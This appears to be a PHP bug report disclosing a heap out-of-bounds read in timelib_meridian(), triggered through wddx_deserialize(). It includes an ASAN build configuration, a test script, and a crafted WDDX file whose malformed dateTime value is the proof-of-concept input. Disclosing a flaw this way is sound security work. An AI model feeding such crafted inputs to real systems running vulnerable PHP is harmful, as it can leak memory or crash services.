Description:
------------
A heap out-of-bound read vulnerability in timelib_meridian() can be triggered via wddx_deserialize() or other vectors that call into this function on untrusted inputs.

$ ~/php-7.1.8/sapi/cli/php --version
PHP 7.1.8 (cli) (built: Aug  9 2017 21:42:13) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies

Configuration:
CC="`which gcc`" CFLAGS="-O0 -g -fsanitize=address" ./configure --disable-shared --enable-wddx

Credit:
Wei Lei and Liu Yang of Nanyang Technological University

Test script:
---------------
$ cat wddx.php
*/
<?php
$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$dir_str = dirname(__FILE__);

$file_str = ($dir_str)."/".$argv[1];

if (!extension_loaded('wddx')) print "wddx not loaded.\n";

$wddx_str = file_get_contents($file_str);
print strlen($wddx_str) . " bytes read.\n";

var_dump(wddx_deserialize($wddx_str));
?>

/*
$ cat repro2.wddx
<?xml version='1.0'?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
<header/>
	<data>
        	<struct>
                    <var name='aDateTime'>
                         <dateTime>frONt of 0 0</dateTime>
                     </var>
                </struct>
	</data>
</wddxPacket>
